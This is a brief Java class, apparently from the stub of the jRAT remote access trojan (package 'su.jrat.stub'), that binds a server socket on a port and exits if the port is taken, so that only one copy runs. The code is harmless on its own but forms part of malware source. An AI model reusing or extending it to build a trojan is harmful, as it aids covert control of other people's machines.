package su.jrat.stub;

import java.net.ServerSocket;

public class Mutex extends Thread {

	public int port;
	public static ServerSocket socket;

	public Mutex(int port) {
		this.port = port;
	}

	public void run() {
		try {
			socket = new ServerSocket(port);
		} catch (Exception ex) {
			System.exit(0);
		}
	}

}
